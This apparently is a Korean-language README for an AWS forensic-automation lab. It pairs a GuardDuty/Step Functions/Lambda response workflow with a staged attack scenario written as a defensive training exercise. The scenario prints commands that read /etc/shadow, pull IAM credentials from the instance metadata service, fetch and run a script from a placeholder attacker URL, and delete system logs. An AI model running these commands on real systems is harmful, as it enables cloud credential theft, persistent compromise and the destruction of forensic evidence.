# AWS_Digital_Forensics_Automation

이 프로젝트는 AWS 환경에서 침해 사고 발생 시 디지털 포렌식 자동화 시스템을 구축하는 데 목적이 있습니다. GuardDuty 경고를 기점으로 Step Functions를 통한 자동화된 대응 및 분석을 수행합니다.

## 프로젝트 개요
 - 상황: 두 개의 가용 영역(AZ1, AZ2)으로 분산된 EC2 환경에서 AZ2 인스턴스가 침해됨
 - 목표: 실시간 위협 탐지 후, 포렌식 수집 및 분석을 자동화하여 빠른 대응 및 보고 체계를 구현
  
 ## 구성도

<img width="1147" alt="image" src="https://github.com/user-attachments/assets/59fa6a6d-01f5-491e-8c57-669edd5ffb72" />

##  공격 및 포렌식 핵심 요약

###  1. 공격 개요

- **공격 유형**: Command Injection
- **침투 경로**: ALB 뒤에 위치한 DVWA 웹 서버
- **권한 탈취**: 웹 서버 루트 권한 및 IMDSv1을 통한 IAM 권한 탈취
- **후속 행위**:
  - IAM 사용자 생성 및 AWS 콘솔 접근
  - 악성 스크립트 실행 (web_user_log.py, pcap.py 등)
  - 비트코인 채굴기 설치 (cpuminer)
  - 포렌식 회피를 위한 로그 삭제 및 히스토리 제거

---

###  2. 포렌식 자동화 프로세스 (L1~L7)

| 단계 | 설명 |
|------|------|
| **L1: 초기 대응** | GuardDuty 탐지 → EventBridge 트리거 → Step Functions 실행 |
| **L1-1** | SES를 통해 침해 경고 메일 발송 |
| **L1-2** | NACL 및 보안 그룹을 통해 악성 IP 차단 |
| **L1-3** | 휘발성 데이터 수집 (메모리, 세션, 프로세스 등) |
| **L2** | 수집된 휘발성 데이터 분석 (S3 저장 후 자동 분석) |
| **L3** | 침해된 인스턴스 격리 (보안 그룹 차단) |
| **L4** | EBS 스냅샷 생성 (비휘발성 데이터 보존용) |
| **L5-1** | 별도 인스턴스에서 비휘발성 데이터 수집 (로그, 파일 등) |
| **L5-2** | CloudTrail 데이터 수집 |
| **L6** | 전체 데이터 종합 분석 (결과 S3 저장) |
| **L7** | 분석 결과를 SES로 관리 담당자에게 전송 |

---

##  사용된 AWS 서비스

| 서비스 | 용도 |
|--------|------|
| EC2    | 대상 인스턴스(amazon linux)|
| ALB    | 사용자 트래픽 분산 |
| NACL   | 악성 IP 차단 |
| S3     | 로그 및 분석 결과 저장 |
| SES    | 관리자 알림 발송 |
| EBS    | 디스크 스냅샷 및 분석용 볼륨 |
| Step Functions | 전체 자동화 워크플로우 실행 |
| Lambda | 세부 작업 자동 실행 |

---

#  공격 시나리오: DVWA - Command Injection

## 개요

이 문서는 DVWA(Damn Vulnerable Web Application) 서버에서 **명령어 삽입 취약점(Command Injection)** 을 악용한 공격 시나리오를 설명합니다.  
공격 대상은 **ALB(Application Load Balancer) 뒤에 위치한 EC2 인스턴스**로, 최대한 많은 아티팩트를 수집하기 위한 실험 목적으로 다음과 같은 조건을 갖습니다:

- **웹 서버가 root 권한으로 실행 중**
- **EC2 인스턴스에 과도한 IAM 권한이 부여됨**
- **IMDSv1 (Instance Metadata Service v1)**


> 이 환경은 EC2 인스턴스에 최대 권한이 부여된 상태에서 원격 코드 실행(RCE) 및 권한 상승(LPE)공격에 의해 탈취된 상황을 가정한 실습 및 대응 훈련을 위한 구조입니다.


---

##  공격 시나리오

<img width="960" alt="스크린샷 2025-05-21 21 22 34" src="https://github.com/user-attachments/assets/c4799623-6251-4a4c-ba6e-e683bb19904d" />

### Step 1: 취약점 발견

1. 공격자는 웹 애플리케이션의 입력 필터링이 제대로 이루어지지 않는 것을 발견하고, 명령어 삽입 취약점이 존재함을 확인합니다.
2. 취약한 파라미터를 통해 쉘 명령어를 삽입하고, 이를 통해 웹 서버의 **root 권한**을 획득합니다.

---

### Step 2: 정보 수집

공격자는 루트 쉘 권한을 확보한 이후, 다음과 같은 명령어를 통해 시스템 내부 정보를 수집하고 AWS 환경에 대한 접근을 시도합니다.

---

#### 시스템 정보 수집

```bash
uname -a               # 커널 정보
ifconfig -a            # 네트워크 인터페이스 정보
id                     # 현재 사용자 정보
cat /etc/passwd        # 계정 목록
netstat -rn            # 라우팅 테이블

find / -name .ssh       # SSH 키 파일 위치 탐색
# → GuardDuty 탐지됨: Execution:Runtime/SuspiciousCommand

cat /home/ec2-user/.ssh/authorized_keys  # SSH 공개키 확인
cat /etc/shadow          # 패스워드 해시 열람 시도
cat /etc/hosts           # 로컬 호스트 정보

# 기본 메타데이터 접근 (IMDSv1 만 해당)
curl http://169.254.169.254/
curl http://169.254.169.254/latest/
curl http://169.254.169.254/latest/meta-data

# IAM 정보 및 보안 자격 증명 확인 (IMDSv1 만 해당)
curl http://169.254.169.254/latest/meta-data/iam/info
curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

###  Step 3: 악성 페이로드 배포

공격자는 루트 권한을 이용해 시스템에 악성 스크립트를 배포하고, AWS 리소스를 장악하기 위한 후속 작업을 수행합니다. 이 단계에서 공격자는 **클라우드 자원 침투**, **외부 C2 서버와의 통신**, **비트코인 채굴** 등의 악성 행위를 실행합니다.

---
악성 스크립트 다운 및 실행
```bash
wget {atcker_url}/setup.sh
chmod +x setup.sh
./setup.sh
```
___

###  setup.sh 요약

- **웹 사용자 정보 탈취**  
  `collect_info.py` 실행을 통해 웹 로그를 분석하고 로그인 시도, 세션 쿠키 등을 수집

- **네트워크 패킷 감청**  
  `pcap.py`를 통해 서버 내에서 발생하는 패킷을 실시간으로 스니핑하여 계정 정보 등 민감 데이터 탈취

- **지속적인 백도어 유지**  
  `C2.py`를 백그라운드에서 실행해 명령 수신 및 원격 제어 가능 상태 유지

- **IAM 사용자 생성 및 AWS 루트 권한 확보**  
  `AdministratorAccess` 권한을 가진 IAM 사용자를 생성하여 AWS 콘솔 및 CLI에 영구 접근 가능

- **비트코인 채굴**  
  `cpuminer`를 설치 및 실행하여 EC2 인스턴스의 CPU 자원을 활용한 암호화폐 채굴 수행

---

###  Step 4: 증거 로그 삭제 및 은폐

공격자는 침해 행위 이후 자신이 남긴 흔적을 지우기 위해 다음과 같은 **로그 삭제 및 은폐 작업**을 수행합니다. 이 과정은 아티팩트를 명확하게 남기기위해 추가하였습니다.

---

```bash
history -c && history -w
rm -f ~/.bash_history
unset HISTFILE
rm -f /var/log/messages
rm -f /var/log/secure
rm -f /var/log/auth.log
rm -f /var/log/wtmp
rm -f /var/log/btmp
rm -f /var/log/lastlog
rm -f /var/log/httpd/access_log
rm -f /var/log/httpd/error_log
rm -f setup.sh
rm -rf /tmp/*
```


---

#  AWS 침해사고 포렌식 자동화 시스템

본 Workflow는 AWS EC2 환경에서 발생한 침해사고에 대해 **자동으로 감지 → 대응 → 포렌식 데이터 수집 및 분석**까지 일련의 절차를 자동화하는 시스템입니다.  
보안 담당자는 실시간 알림을 수신하고, 위협 인스턴스 격리 및 분석 결과를 자동으로 받아볼 수 있습니다.

---

##  개요

- **환경**: EC2가 AZ1, AZ2에 걸쳐 운영되며, Application Load Balancer(ALB)로 외부 사용자 접근을 수용
- **상황**: AZ2의 EC2 인스턴스가 침해되었고, 공격자는 웹 루트를 통해 명령어 삽입 공격을 감행
- **대응**: GuardDuty와 연동된 자동화 시스템이 침해 행위를 탐지하고, 포렌식 분석 및 대응 절차가 시작됨

---

##  아키텍처 흐름


---

##  단계별 구성 설명

###  L1단계: 탐지 및 초기 대응

- **L1-1: 침해사고 알림**
  - SES(Simple Email Service)를 통해 보안 담당자에게 침해 사실 알림 발송
- **L1-2: IP 차단**
  - 공격자의 IP를 NACL(Network ACL)에 등록하여 차단
  - 동시에 악성 IP 목록에 기록 (`악성 IP Bucket` 저장)

---

###  L2 ~ L7단계: 포렌식 자동화

- **L1-3: 휘발성 데이터 수집**
  - 침해된 EC2 인스턴스에서 메모리, 네트워크 세션 등 휘발성 데이터 수집

- **L2: 휘발성 데이터 분석**
  - 수집된 휘발성 데이터를 분석하여 공격 흔적 식별

- **L3: 인스턴스 격리**
  - Security Group을 변경하여 외부 연결 차단

- **L4: 스냅샷 생성**
  - 해당 인스턴스의 EBS 볼륨을 스냅샷 생성하여 보존

- **L5-1: 비휘발성 데이터 수집**
  - 스냅샷을 마운트한 새로운 인스턴스에서 파일, 로그 등 비휘발성 데이터 추출
 
- **L5-2:CloudTrail 데이터 수집**
  - CloudTrail의 로그 수집

- **L6: 전체 데이터 분석**
  - 휘발성 + 비휘발성 데이터 통합 분석 및 증거 정리

- **L7: 결과 전송**
  - 분석 결과를 S3에 저장한 후 SES를 통해 담당자에게 전송
---

##  Lambda 함수 설명 (`forensic_workflow/lambda/`)

본 디렉터리는 AWS Step Functions와 연계되어 포렌식 자동화 과정의 각 단계를 수행하는 **Lambda 함수들**로 구성되어 있습니다.

| 파일명 | 역할 설명 |
|--------|-----------|
| `AddMaliciousIPToNACL.py` | 공격자로 추정되는 IP를 **NACL(Network ACL)**에 등록하여 트래픽 차단 |
| `CloudTrail_Lambda.py` | **CloudTrail 로그 이벤트**를 분석하여 이상 행위 여부를 확인 |
| `Forensic_Analysis.py` | 수집된 **휘발성 및 비휘발성 데이터 종합 분석**, 결과 생성 |
| `IsolatedInstance.py` | EC2 인스턴스의 **보안 그룹을 변경하여 네트워크 격리** 수행 |
| `Memory_Collect_1.py` | **휘발성 데이터 수집 - 프로세스, 연결 포트 등** 수집 |
| `Memory_Collect_2.py` | **추가 휘발성 정보 수집** (네트워크 세션, 사용자 세션 등) |
| `Non_Volatility_Collect.py` | 마운트된 볼륨에서 **비휘발성 데이터 수집** (파일, 로그 등) |
| `Snapshot.py` | 대상 EC2 인스턴스의 **EBS 스냅샷 생성** 및 신규 인스턴스에 **볼륨 마운트** 수행 |
| `sendEmailWithNotification.py` | **침해 탐지 알림 메일 발송** (L1-1 단계) |
| `sendEmailWithReport.py` | **포렌식 분석 결과 보고서 메일 전송** (L7 단계) |

---


